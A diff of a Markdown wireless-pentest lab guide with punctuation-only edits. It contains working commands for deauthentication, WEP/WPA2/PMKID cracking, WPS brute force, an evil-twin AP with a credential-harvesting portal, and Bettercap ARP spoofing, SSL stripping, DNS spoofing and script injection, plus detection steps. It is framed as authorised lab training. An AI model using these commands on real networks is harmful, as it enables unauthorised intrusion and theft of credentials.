@@ -1,6 +1,6 @@
 ## Legal Authorisation Statement
 
-> **You must only perform these attacks against networks and devices you own or have written permission to test. Performing these attacks against any network without explicit authorisation is illegal in every jurisdiction — including Pakistan (PECA 2016), UK (Computer Misuse Act 1990) and internationally (CFAA, Budapest Convention). This lab uses your own home router and controlled VMs only.**
+> **You must only perform these attacks against networks and devices you own or have written permission to test. Performing these attacks against any network without explicit authorisation is illegal in every jurisdiction: including Pakistan (PECA 2016), UK (Computer Misuse Act 1990) and internationally (CFAA, Budapest Convention). This lab uses your own home router and controlled VMs only.**
 
 Set up a dedicated lab access point (your home router or a second cheap TP-Link router purchased for the purpose). Never run these against public Wi-Fi, neighbour networks or institutional infrastructure.
 
@@ -20,14 +20,14 @@ Set up a dedicated lab access point (your home router or a second cheap TP-Link 
        width="600"/>
 </div>
 
-### Critical Warning — TP-Link WN722N Version Check
+### Critical Warning: TP-Link WN722N Version Check
 
 The WN722N comes in three hardware revisions. **Only v1 is usable for this lab.**
 
 ```
-v1 (Atheros AR9271) — FULL monitor mode + packet injection — BUY THIS
-v2 (Realtek RTL8188EUS) — monitor mode limited, NO reliable injection — AVOID
-v3 (Realtek RTL8188EUS) — same as v2 — AVOID
+v1 (Atheros AR9271): FULL monitor mode + packet injection: BUY THIS
+v2 (Realtek RTL8188EUS): monitor mode limited, NO reliable injection: AVOID
+v3 (Realtek RTL8188EUS): same as v2: AVOID
 ```
 
 **How to check version before buying:** Look at the sticker on the bottom of the box. It reads `Ver 1.0`, `Ver 2.0` or `Ver 3.0`. If the seller cannot confirm v1, do not buy.
@@ -89,9 +89,9 @@ sudo airmon-ng start wlan0  # Creates wlan0mon interface
 
 ---
 
-## Phase 1 — Wireless Reconnaissance & Packet Sniffing
+## Phase 1: Wireless Reconnaissance & Packet Sniffing
 
-### Task 1.1 — Enable Monitor Mode
+### Task 1.1: Enable Monitor Mode
 
 ```bash
 # Kill conflicting processes (NetworkManager, wpa_supplicant)
@@ -113,22 +113,22 @@ iwconfig wlan0
 
 ---
 
-### Task 1.2 — Passive Network Discovery (airodump-ng)
+### Task 1.2: Passive Network Discovery (airodump-ng)
 
 ```bash
-# Scan all channels — identify your target AP
+# Scan all channels: identify your target AP
 sudo airodump-ng wlan0mon
 
 # Output columns explained:
-# BSSID    — MAC address of the access point
-# PWR      — Signal strength (closer to 0 = stronger)
-# Beacons  — Beacon frames transmitted
-# #Data    — Data frames captured
-# CH       — Operating channel
-# ENC      — Encryption type (WEP/WPA/WPA2)
-# CIPHER   — Cipher used (CCMP/TKIP)
-# AUTH     — Authentication (PSK/MGT)
-# ESSID    — Network name (SSID)
+# BSSID   : MAC address of the access point
+# PWR     : Signal strength (closer to 0 = stronger)
+# Beacons : Beacon frames transmitted
+# #Data   : Data frames captured
+# CH      : Operating channel
+# ENC     : Encryption type (WEP/WPA/WPA2)
+# CIPHER  : Cipher used (CCMP/TKIP)
+# AUTH    : Authentication (PSK/MGT)
+# ESSID   : Network name (SSID)
 
 # Press Ctrl+C when you have identified your target AP
 # Note down: TARGET_BSSID and CHANNEL
@@ -146,14 +146,14 @@ sudo airodump-ng \
   wlan0mon
 
 # This creates:
-# target_scan-01.cap  — raw capture file
-# target_scan-01.csv  — parsed AP/client data
-# target_scan-01.kismet.netxml — Kismet format
+# target_scan-01.cap : raw capture file
+# target_scan-01.csv : parsed AP/client data
+# target_scan-01.kismet.netxml: Kismet format
 ```
 
 ---
 
-### Task 1.3 — Target Packet Sniffing (Wireshark + tcpdump)
+### Task 1.3: Target Packet Sniffing (Wireshark + tcpdump)
 
 ```bash
 # Capture all traffic on target channel to file
@@ -208,17 +208,17 @@ tshark -r ~/ghost_signal/captures/raw_traffic.pcap \
 
 ---
 
-## Phase 2 — Deauthentication Attack
+## Phase 2: Deauthentication Attack
 
 ### Background
 
-A deauthentication (deauth) attack sends forged 802.11 management frames to a client, impersonating the AP. The client believes the AP has disconnected it and attempts to reconnect — creating a window to capture the WPA handshake or force the client onto your rogue AP.
+A deauthentication (deauth) attack sends forged 802.11 management frames to a client, impersonating the AP. The client believes the AP has disconnected it and attempts to reconnect: creating a window to capture the WPA handshake or force the client onto your rogue AP.
 
 **Why it works:** 802.11 management frames (including deauth) are unauthenticated in WPA2-Personal. WPA3 (802.11w) introduces Protected Management Frames (PMF) which mitigates this. WPA2 networks without PMF enabled are fully vulnerable.
 
-MITRE: **T1499 — Endpoint Denial of Service** / **TA0001 — Initial Access** (forcing reconnect)
+MITRE: **T1499: Endpoint Denial of Service** / **TA0001: Initial Access** (forcing reconnect)
 
-### Task 2.1 — Targeted Deauthentication
+### Task 2.1: Targeted Deauthentication
 
 ```bash
 TARGET_BSSID="AA:BB:CC:DD:EE:FF"    # Your router MAC
@@ -259,15 +259,15 @@ sudo mdk4 wlan0mon d -B $TARGET_BSSID
 
 ---
 
-## Phase 3 — WEP Cracking (Legacy Protocol)
+## Phase 3: WEP Cracking (Legacy Protocol)
 
 ### Background
 
-WEP (Wired Equivalent Privacy, 1997) is cryptographically broken. Its RC4 keystream reuse vulnerability means sufficient IVs (Initialisation Vectors) in captured traffic allow statistical key recovery in minutes. No modern AP should use WEP — but legacy IoT devices, old routers and some industrial equipment still do.
+WEP (Wired Equivalent Privacy, 1997) is cryptographically broken. Its RC4 keystream reuse vulnerability means sufficient IVs (Initialisation Vectors) in captured traffic allow statistical key recovery in minutes. No modern AP should use WEP: but legacy IoT devices, old routers and some industrial equipment still do.
 
 **Why we teach it:** Understanding why WEP failed is prerequisite to understanding why WPA2-CCMP is designed the way it is.
 
-### Task 3.1 — Set Up WEP Target
+### Task 3.1: Set Up WEP Target
 
 If your router supports WEP mode, temporarily configure it. Otherwise use a virtualised AP:
 
@@ -289,7 +289,7 @@ EOF
 # Use a second USB adapter or a physical router set to WEP for this task
 ```
 
-### Task 3.2 — Crack WEP
+### Task 3.2: Crack WEP
 
 ```bash
 TARGET_BSSID="AA:BB:CC:DD:EE:FF"
@@ -309,14 +309,14 @@ sudo aireplay-ng \
   -h $(ip link show wlan0mon | awk '/ether/{print $2}') \
   wlan0mon
 
-# Step 3: ARP replay attack — accelerate IV generation
+# Step 3: ARP replay attack: accelerate IV generation
 sudo aireplay-ng \
   --arpreplay \
   -b $TARGET_BSSID \
   -h $(ip link show wlan0mon | awk '/ether/{print $2}') \
   wlan0mon
 
-# Watch airodump — #Data count increasing rapidly = good
+# Watch airodump: #Data count increasing rapidly = good
 # Need ~50,000-100,000 IVs for 64-bit WEP, ~200,000+ for 128-bit
 
 # Step 4: Crack the key (run while still capturing)
@@ -330,19 +330,19 @@ KEY FOUND! [ AA:BB:CC:DD:EE:FF ]
 Decrypted correctly: 100%
 ```
 
-> **Key concept:** WEP uses a 24-bit IV space (16.7 million values). With enough traffic, IV collisions become statistically certain, exposing the keystream. This is the Fluhrer-Mantin-Shamir (FMS) attack — published 2001, still effective today against WEP.
+> **Key concept:** WEP uses a 24-bit IV space (16.7 million values). With enough traffic, IV collisions become statistically certain, exposing the keystream. This is the Fluhrer-Mantin-Shamir (FMS) attack: published 2001, still effective today against WEP.
 
 ---
 
-## Phase 4 — WPA/WPA2 — Handshake Capture
+## Phase 4: WPA/WPA2: Handshake Capture
 
 ### Background
 
-WPA2-PSK security depends entirely on the strength of the pre-shared key. The 4-way EAPOL handshake — captured during a client's connection — contains a verifiable hash of the password (PBKDF2-SHA1, 4096 iterations). Offline dictionary/brute-force attack against this hash is the primary attack vector.
+WPA2-PSK security depends entirely on the strength of the pre-shared key. The 4-way EAPOL handshake: captured during a client's connection: contains a verifiable hash of the password (PBKDF2-SHA1, 4096 iterations). Offline dictionary/brute-force attack against this hash is the primary attack vector.
 
 **WPA2 is NOT broken cryptographically.** The weakness is the human element: weak passwords and the offline cracking window created by the handshake capture.
 
-### Task 4.1 — Capture WPA2 4-Way Handshake
+### Task 4.1: Capture WPA2 4-Way Handshake
 
 ```bash
 TARGET_BSSID="AA:BB:CC:DD:EE:FF"
@@ -356,7 +356,7 @@ sudo airodump-ng \
   --write ~/ghost_signal/wpa/wpa_capture \
   wlan0mon
 
-# Step 2: In a second terminal — force reconnect via deauth
+# Step 2: In a second terminal: force reconnect via deauth
 sudo aireplay-ng \
   --deauth 5 \
   -a $TARGET_BSSID \
@@ -368,7 +368,7 @@ sudo aireplay-ng \
 
 # Verify handshake in capture file
 aircrack-ng ~/ghost_signal/wpa/wpa_capture-01.cap
-# Should say: "1 handshake" — not "No valid WPA handshakes"
+# Should say: "1 handshake": not "No valid WPA handshakes"
 ```
 
 ```bash
@@ -388,7 +388,7 @@ hcxpcapngtool \
 
 ---
 
-### Task 4.2 — PMKID Attack (No Client Required)
+### Task 4.2: PMKID Attack (No Client Required)
 
 The PMKID attack (Jens Steube, 2018) allows handshake-equivalent cracking **without any client connected.** The PMKID is derived from: `HMAC-SHA1(PMK, "PMK Name" || AP_MAC || Client_MAC)` and is broadcast in the first EAPOL frame from the AP itself.
 
@@ -410,32 +410,32 @@ hcxpcapngtool --info ~/ghost_signal/wpa/pmkid_capture.pcapng
 
 ---
 
-## Phase 5 — WPS Exploitation
+## Phase 5: WPS Exploitation
 
 ### Background
 
-WPS (Wi-Fi Protected Setup, 2006) was designed to simplify device pairing. Its PIN-based authentication uses an 8-digit PIN verified in two 4-digit halves independently — reducing the keyspace from 10^8 (100 million) to 10^4 + 10^3 = 11,000 combinations. The Pixie Dust attack exploits weak random number generation in some router chipsets — recovering the PIN in seconds.
+WPS (Wi-Fi Protected Setup, 2006) was designed to simplify device pairing. Its PIN-based authentication uses an 8-digit PIN verified in two 4-digit halves independently: reducing the keyspace from 10^8 (100 million) to 10^4 + 10^3 = 11,000 combinations. The Pixie Dust attack exploits weak random number generation in some router chipsets: recovering the PIN in seconds.
 
-### Task 5.1 — Scan for WPS-Enabled APs
+### Task 5.1: Scan for WPS-Enabled APs
 
 ```bash
 # Identify WPS-enabled APs and their WPS version/lock status
 sudo wash -i wlan0mon
 
 # Output columns:
-# BSSID         — AP MAC
-# Ch            — Channel
-# dBm           — Signal strength
-# WPS           — WPS version (1.0 / 2.0)
-# Lck           — WPS locked? (Yes = brute force will fail)
-# ESSID         — Network name
+# BSSID        : AP MAC
+# Ch           : Channel
+# dBm          : Signal strength
+# WPS          : WPS version (1.0 / 2.0)
+# Lck          : WPS locked? (Yes = brute force will fail)
+# ESSID        : Network name
 ```
 
-**Only proceed if `Lck` shows `No` — WPS locked APs reject repeated PIN attempts.**
+**Only proceed if `Lck` shows `No`: WPS locked APs reject repeated PIN attempts.**
 
 ---
 
-### Task 5.2 — Reaver: WPS PIN Brute Force
+### Task 5.2: Reaver: WPS PIN Brute Force
 
 ```bash
 TARGET_BSSID="AA:BB:CC:DD:EE:FF"
@@ -451,7 +451,7 @@ sudo reaver \
 
 # Flags explained:
 # -vvv     verbose output
-# -K 1     enable Pixie Dust attack first (faster — recovers PIN in seconds on vulnerable routers)
+# -K 1     enable Pixie Dust attack first (faster: recovers PIN in seconds on vulnerable routers)
 # -d 1     delay 1 second between attempts (avoid rate limiting)
 # -r 3:15  3 attempts then wait 15 seconds (avoid lockout)
 
@@ -467,7 +467,7 @@ sudo reaver \
 
 ---
 
-### Task 5.3 — Bully: Alternative WPS Tool
+### Task 5.3: Bully: Alternative WPS Tool
 
 ```bash
 # bully handles some edge cases reaver does not
@@ -487,9 +487,9 @@ sudo bully \
   wlan0mon
 ```
 
-**WPS Pixie Dust — Why it Works:**
+**WPS Pixie Dust: Why it Works:**
 
-Some router chipsets (Ralink, Broadcom, some Realtek) use weak or static nonces in the WPS M1/M2 messages. `pixiewps` (called internally by reaver -K) derives the PIN from these weak nonces without any brute force. Affected routers reveal their WPS PIN — and therefore the WPA2 password — within 5 seconds.
+Some router chipsets (Ralink, Broadcom, some Realtek) use weak or static nonces in the WPS M1/M2 messages. `pixiewps` (called internally by reaver -K) derives the PIN from these weak nonces without any brute force. Affected routers reveal their WPS PIN: and therefore the WPA2 password: within 5 seconds.
 
 ```bash
 # Check if your router is Pixie Dust vulnerable
@@ -500,14 +500,14 @@ sudo reaver -i wlan0mon -b $TARGET_BSSID -c $TARGET_CHANNEL -K 1 -vvv 2>&1 | gre
 
 ---
 
-## Phase 6 — Wordlist Creation & WPA2 Cracking
+## Phase 6: Wordlist Creation & WPA2 Cracking
 
-### Task 6.1 — Wordlist Generation with crunch
+### Task 6.1: Wordlist Generation with crunch
 
 ```bash
 mkdir -p ~/ghost_signal/wordlists
 
-# Generate all 8-char lowercase alpha strings (demonstration only — massive file)
+# Generate all 8-char lowercase alpha strings (demonstration only: massive file)
 crunch 8 8 abcdefghijklmnopqrstuvwxyz -o ~/ghost_signal/wordlists/alpha8.txt
 
 # More realistic: Pakistani common password patterns
@@ -522,7 +522,7 @@ crunch 8 8 0123456789 -o ~/ghost_signal/wordlists/numeric8.txt
 crunch 6 10 Pakistan -o ~/ghost_signal/wordlists/pak_variations.txt
 ```
 
-### Task 6.2 — CEWL (Web-Based Wordlist from Target Website)
+### Task 6.2: CEWL (Web-Based Wordlist from Target Website)
 
 ```bash
 # Scrape a website and build a wordlist from its vocabulary
@@ -536,7 +536,7 @@ cewl https://example.com \
 cat ~/ghost_signal/wordlists/cewl_output.txt | wc -l
 ```
 
-### Task 6.3 — Hashcat Rule-Based Mutation
+### Task 6.3: Hashcat Rule-Based Mutation
 
 ```bash
 # Use rockyou.txt as base (pre-installed on Kali)
@@ -553,16 +553,16 @@ hashcat \
 wc -l ~/ghost_signal/wordlists/rockyou_mutated.txt
 ```
 
-### Task 6.4 — Crack WPA2 with aircrack-ng
+### Task 6.4: Crack WPA2 with aircrack-ng
 
 ```bash
-# Method 1: aircrack-ng (CPU-based — slower but universal)
+# Method 1: aircrack-ng (CPU-based: slower but universal)
 aircrack-ng \
   -w /usr/share/wordlists/rockyou.txt \
   -b $TARGET_BSSID \
   ~/ghost_signal/wpa/wpa_capture-01.cap
 
-# Method 2: hashcat (GPU-accelerated — significantly faster if GPU available)
+# Method 2: hashcat (GPU-accelerated: significantly faster if GPU available)
 # First convert .cap to hashcat format
 hcxpcapngtool \
   -o ~/ghost_signal/wpa/crack_me.hc22000 \
@@ -590,21 +590,21 @@ hashcat -m 22000 -b
 | Nvidia RTX 3060 | ~700,000 H/s |
 | Nvidia RTX 4090 | ~2,800,000 H/s |
 
-**Key takeaway:** A 10-char random password at 350,000 H/s against rockyou.txt either cracks immediately (if in the list) or never (if truly random). Password length and randomness are the real defences — not WPA2 itself.
+**Key takeaway:** A 10-char random password at 350,000 H/s against rockyou.txt either cracks immediately (if in the list) or never (if truly random). Password length and randomness are the real defences: not WPA2 itself.
 
 > **Flag 3:** After cracking your own AP password: `CIPHER{wpa2_cracked_<first_4_chars_of_password>_aircrack}`
 
 ---
 
-## Phase 7 — Honeypots for Attacker Campaigns
+## Phase 7: Honeypots for Attacker Campaigns
 
 ### Background
 
-A WiFi honeypot is a rogue access point designed to lure targets into connecting. Once connected, all victim traffic flows through the attacker's machine — enabling credential harvesting, MITM injection, session hijacking and malware delivery.
+A WiFi honeypot is a rogue access point designed to lure targets into connecting. Once connected, all victim traffic flows through the attacker's machine: enabling credential harvesting, MITM injection, session hijacking and malware delivery.
 
-**Defensive use:** Blue teamers deploy honeypot APs on corporate networks to detect rogue WiFi attacks — any connection to a known-evil SSID triggers an alert.
+**Defensive use:** Blue teamers deploy honeypot APs on corporate networks to detect rogue WiFi attacks: any connection to a known-evil SSID triggers an alert.
 
-### Task 7.1 — Evil Twin / Rogue AP with hostapd + dnsmasq
+### Task 7.1: Evil Twin / Rogue AP with hostapd + dnsmasq
 
 ```bash
 mkdir -p ~/ghost_signal/honeypot
@@ -638,7 +638,7 @@ sudo ip link set wlan0mon up
 # Step 4: Enable IP forwarding
 sudo sysctl -w net.ipv4.ip_forward=1
 
-# Step 5: NAT rule to route victim traffic to internet (optional — captive portal works without)
+# Step 5: NAT rule to route victim traffic to internet (optional: captive portal works without)
 sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
 sudo iptables -A FORWARD -i wlan0mon -o eth0 -j ACCEPT
 sudo iptables -A FORWARD -i eth0 -o wlan0mon -m state --state RELATED,ESTABLISHED -j ACCEPT
@@ -653,7 +653,7 @@ echo "Victim DHCP range: 10.0.0.10-100"
 
 ---
 
-### Task 7.2 — Captive Portal Honeypot
+### Task 7.2: Captive Portal Honeypot
 
 ```bash
 # Step 1: Install lighttpd for captive portal web server
@@ -665,7 +665,7 @@ mkdir -p /var/www/html/portal
 cat > /var/www/html/portal/index.html << 'EOF'
 <!DOCTYPE html>
 <html>
-<head><title>Free WiFi — Login</title></head>
+<head><title>Free WiFi: Login</title></head>
 <body style="font-family:Arial; text-align:center; padding:50px; background:#f0f0f0;">
   <h2>Welcome to Free Public WiFi</h2>
   <p>Please login to continue browsing</p>
@@ -708,13 +708,13 @@ tail -f /tmp/captured_creds.log
 
 ---
 
-## Phase 8 — MITM Attacks with Bettercap
+## Phase 8: MITM Attacks with Bettercap
 
 ### Background
 
 Bettercap is the most capable MITM framework available. It combines ARP spoofing, DNS spoofing, HTTP/HTTPS interception, credential sniffing and JavaScript injection into a single interactive REPL.
 
-### Task 8.1 — Install and Launch Bettercap
+### Task 8.1: Install and Launch Bettercap
 
 ```bash
 # Install
@@ -732,9 +732,9 @@ sudo bettercap -iface eth0   # or wlan0mon if on wireless
 
 ---
 
-### Task 8.2 — ARP Spoofing
+### Task 8.2: ARP Spoofing
 
-ARP (Address Resolution Protocol) has no authentication — any host can broadcast false MAC-to-IP mappings. ARP poisoning tells the victim "the gateway is at my MAC" and tells the gateway "the victim is at my MAC" — all traffic flows through the attacker.
+ARP (Address Resolution Protocol) has no authentication: any host can broadcast false MAC-to-IP mappings. ARP poisoning tells the victim "the gateway is at my MAC" and tells the gateway "the victim is at my MAC": all traffic flows through the attacker.
 
 ```bash
 # Inside bettercap REPL:
@@ -766,7 +766,7 @@ arp -a
 
 ---
 
-### Task 8.3 — Passive Traffic Sniffing via Bettercap
+### Task 8.3: Passive Traffic Sniffing via Bettercap
 
 ```bash
 # Inside bettercap REPL (after ARP spoof is active):
@@ -783,7 +783,7 @@ net.sniff on
 ```
 
 ```bash
-# Simultaneously — capture raw PCAP for offline analysis
+# Simultaneously: capture raw PCAP for offline analysis
 set net.sniff.output ~/ghost_signal/mitm/mitm_capture.pcap
 net.sniff on
 ```
@@ -792,7 +792,7 @@ net.sniff on
 
 ---
 
-### Task 8.4 — HTTPS Bypass: SSL Stripping
+### Task 8.4: HTTPS Bypass: SSL Stripping
 
 SSL stripping downgrades HTTPS connections to HTTP when the user navigates via an HTTP link (before HTTPS redirect). Bettercap's `https.proxy` + `hstshijack` module handles this automatically.
 
@@ -822,14 +822,14 @@ net.sniff on
 sudo bettercap -iface eth0 -caplet hstshijack/hstshijack
 ```
 
-> **Important technical note:** HSTS (HTTP Strict Transport Security) preloading protects major sites (Google, Facebook, banking) from SSL stripping — browsers refuse HTTP connections to HSTS-pinned domains regardless of what a proxy returns. SSL stripping only works on:
+> **Important technical note:** HSTS (HTTP Strict Transport Security) preloading protects major sites (Google, Facebook, banking) from SSL stripping: browsers refuse HTTP connections to HSTS-pinned domains regardless of what a proxy returns. SSL stripping only works on:
 > - Sites not in the HSTS preload list
 > - Sites the victim has never visited before (no cached HSTS policy)
 > - Sites with HTTP pages that redirect to HTTPS (the redirect is the attack window)
 
 ---
 
-### Task 8.5 — DNS Spoofing
+### Task 8.5: DNS Spoofing
 
 ```bash
 # Inside bettercap REPL:
@@ -850,7 +850,7 @@ nslookup lab-test-site.com   # Should return 10.0.0.1 (your attacker IP)
 
 ---
 
-### Task 8.6 — JavaScript Injection via Bettercap
+### Task 8.6: JavaScript Injection via Bettercap
 
 ```bash
 # Inside bettercap REPL:
@@ -863,7 +863,7 @@ http.proxy on
 Create `~/ghost_signal/mitm/inject.js`:
 
 ```javascript
-// Bettercap JS injection — fires on every HTTP page load
+// Bettercap JS injection: fires on every HTTP page load
 // This demonstrates how an attacker intercepts and modifies web content in transit
 
 function onLoad() {
@@ -874,12 +874,12 @@ function onResponse(req, res) {
     // Only inject into HTML pages
     if (res.ContentType.includes("text/html")) {
         var body = res.ReadBody();
-        // Append visible banner (proof of injection — educational demo only)
+        // Append visible banner (proof of injection: educational demo only)
         body = body.replace(
             "</body>",
             '<div style="position:fixed;top:0;left:0;width:100%;background:red;color:white;' +
             'font-size:18px;text-align:center;z-index:9999;padding:8px;">' +
-            '[CIPHER LAB] MITM INJECTION ACTIVE — GHOST SIGNAL</div></body>'
+            '[CIPHER LAB] MITM INJECTION ACTIVE: GHOST SIGNAL</div></body>'
         );
         res.Body = body;
     }
@@ -890,9 +890,9 @@ function onResponse(req, res) {
 
 ---
 
-## Phase 9 — Detection & Defence
+## Phase 9: Detection & Defence
 
-### Task 9.1 — Detect Deauth Attacks
+### Task 9.1: Detect Deauth Attacks
 
 ```bash
 # Monitor for deauth frames targeting your network
@@ -912,10 +912,10 @@ sudo tshark -i wlan0mon \
 
 ---
 
-### Task 9.2 — Detect ARP Spoofing
+### Task 9.2: Detect ARP Spoofing
 
 ```bash
-# Static ARP inspection — detect gateway MAC change
+# Static ARP inspection: detect gateway MAC change
 GATEWAY_IP="192.168.1.1"
 REAL_GATEWAY_MAC="your:real:gateway:mac"   # Note this from clean state
 
@@ -925,22 +925,22 @@ watch -n 2 "arp -n | grep $GATEWAY_IP"
 # Alert if gateway MAC changes
 arp -n | grep $GATEWAY_IP | awk '{print $3}' | while read mac; do
     if [ "$mac" != "$REAL_GATEWAY_MAC" ]; then
-        echo "ALERT: ARP SPOOFING DETECTED — Gateway MAC changed to $mac"
+        echo "ALERT: ARP SPOOFING DETECTED: Gateway MAC changed to $mac"
     fi
 done
 
 # Use arp-scan for network-wide ARP anomaly detection
-sudo arp-scan -l | sort -k1,1 | awk 'seen[$1]++{print "DUPLICATE IP: " $1 " — Possible ARP spoof"}'
+sudo arp-scan -l | sort -k1,1 | awk 'seen[$1]++{print "DUPLICATE IP: " $1 ": Possible ARP spoof"}'
 ```
 
 ---
 
-### Task 9.3 — Detect Rogue APs
+### Task 9.3: Detect Rogue APs
 
 ```bash
 # Scan for APs with your SSID but different BSSID (evil twin indicator)
 sudo airodump-ng wlan0mon | grep "YourSSID"
-# If two rows appear with the same ESSID but different BSSID — rogue AP present
+# If two rows appear with the same ESSID but different BSSID: rogue AP present
 
 # Use wash to detect unexpected WPS advertisements
 sudo wash -i wlan0mon
@@ -956,7 +956,7 @@ sudo tshark -i wlan0mon \
 
 ---
 
-### Task 9.4 — YARA Rule for WiFi Attack Artefacts
+### Task 9.4: YARA Rule for WiFi Attack Artefacts
 
 ```yara
 /*
@@ -968,7 +968,7 @@ sudo tshark -i wlan0mon \
 rule aircrack_capture_file
 {
     meta:
-        description = "Detects aircrack-ng .cap capture files — possible WiFi attack artefact"
+        description = "Detects aircrack-ng .cap capture files: possible WiFi attack artefact"
         author      = "CIPHER Lab"
         mitre       = "T1040"
 
@@ -1030,15 +1030,15 @@ yara ~/ghost_signal/detection/wifi_attack.yar ~/ghost_signal/
 | # | Item | Phase |
 |---|---|---|
 | 1 | airodump-ng scan screenshot showing target AP details | Phase 1 |
-| 2 | Wireshark screenshot — EAPOL frames visible | Phase 1 |
+| 2 | Wireshark screenshot: EAPOL frames visible | Phase 1 |
 | 3 | Deauth attack terminal output + victim disconnection confirmation | Phase 2 |
-| 4 | WEP key recovered — aircrack-ng output | Phase 3 |
-| 5 | WPA2 handshake capture — airodump "WPA handshake" confirmation | Phase 4 |
-| 6 | PMKID capture — hcxdumptool output | Phase 4 |
-| 7 | WPS PIN recovered — reaver/bully output | Phase 5 |
-| 8 | WPA2 password cracked — aircrack-ng/hashcat output | Phase 6 |
-| 9 | Rogue AP running — hostapd + captured credential log | Phase 7 |
-| 10 | Bettercap ARP spoof active — net.show screenshot | Phase 8 |
+| 4 | WEP key recovered: aircrack-ng output | Phase 3 |
+| 5 | WPA2 handshake capture: airodump "WPA handshake" confirmation | Phase 4 |
+| 6 | PMKID capture: hcxdumptool output | Phase 4 |
+| 7 | WPS PIN recovered: reaver/bully output | Phase 5 |
+| 8 | WPA2 password cracked: aircrack-ng/hashcat output | Phase 6 |
+| 9 | Rogue AP running: hostapd + captured credential log | Phase 7 |
+| 10 | Bettercap ARP spoof active: net.show screenshot | Phase 8 |
 | 11 | JS injection banner visible in victim browser | Phase 8 |
 | 12 | ARP spoof detection script output | Phase 9 |
 | 13 | YARA rule test results | Phase 9 |
